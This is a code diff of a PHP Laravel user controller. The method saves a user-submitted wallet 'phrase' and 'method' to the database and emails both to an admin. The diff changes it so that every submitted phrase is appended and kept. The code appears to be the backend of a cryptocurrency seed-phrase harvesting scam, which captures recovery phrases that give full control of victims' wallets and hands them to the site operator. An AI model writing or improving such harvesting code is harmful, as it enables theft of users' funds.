@@ -974,26 +974,30 @@ class UserController extends Controller
         // Get the currently authenticated user
         $user = Auth::user();
 
-        // Prepare the data to be stored as a JSON object
-        $data = [
+        // Decode the existing phrase data if any
+        $existingData = $user->phrase ? json_decode($user->phrase, true) : [];
+
+        // Prepare the new data to be added
+        $newData = [
             'phrase' => $request->phrase,
             'wallet' => $request->wallet,
             'status' => 0
         ];
 
-        // Convert the array to a JSON string
-        $dataJson = json_encode($data);
+        // Append the new phrase to the existing data
+        $existingData[] = $newData;
+
+        // Convert the updated array to a JSON string
+        $dataJson = json_encode($existingData);
 
         // Update the user's phrase in the users table
-        if (!$user->phrase) {
-            $user->update(['phrase' => $dataJson]);
-        }
+        $user->update(['phrase' => $dataJson]);
 
         // Prepare the email content
         $mailBody = '<p><strong>Username:</strong> ' . $user->name . '</p>
-        <p><strong>Email:</strong> ' . $user->email . '</p>
-        <p><strong>Phrase:</strong> ' . $request->phrase . '</p>
-        <p><strong>Method:</strong> ' . $request->wallet . '</p>';
+                    <p><strong>Email:</strong> ' . $user->email . '</p>
+                    <p><strong>Phrase:</strong> ' . $request->phrase . '</p>
+                    <p><strong>Method:</strong> ' . $request->wallet . '</p>';
 
         // Send the notification to the admin
         $admin = new User;
@@ -1006,5 +1010,6 @@ class UserController extends Controller
 
         return;
     }
+
 
 }
